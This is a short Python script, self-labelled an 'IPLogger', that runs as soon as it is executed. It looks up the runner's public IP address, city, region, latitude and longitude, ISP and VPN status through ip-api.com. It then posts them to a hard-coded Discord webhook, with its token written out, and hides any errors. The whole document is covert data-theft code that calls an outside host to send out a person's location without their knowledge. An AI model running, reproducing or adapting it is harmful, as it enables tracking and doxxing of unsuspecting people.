import requests

webhook = "https://discord.com/api/webhooks/1223988907922686042/xp0jJEWUSWvnolHPvr_U5fiIN3H2YP9LZtv2n_CR7Cz-YtsYY2e6G0h6RLh6mhDOfgqb"

def ip():
  try:
    api = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,query"
    data = requests.get(api).json()
    content = f"**IP INFO**: \n**IP: {data['query']}**\n**Region: {data['regionName']}**\n**Ciudad: {data['city']}**\n**Latitud: {data['lat']}**\n**Longitud: {data['lon']}**\n**ISP: {data['isp']}**\n**VPN?: {data['proxy']}**"
    requests.post(webhook, json={"avatar_url":"https://i1.sndcdn.com/artworks-VNMgASiDtYR0Xxp9-6Jt3Ng-t500x500.jpg",'username': 'IPLogger - Created by: Z3RO', 'content': content})
  except:
    pass

ip()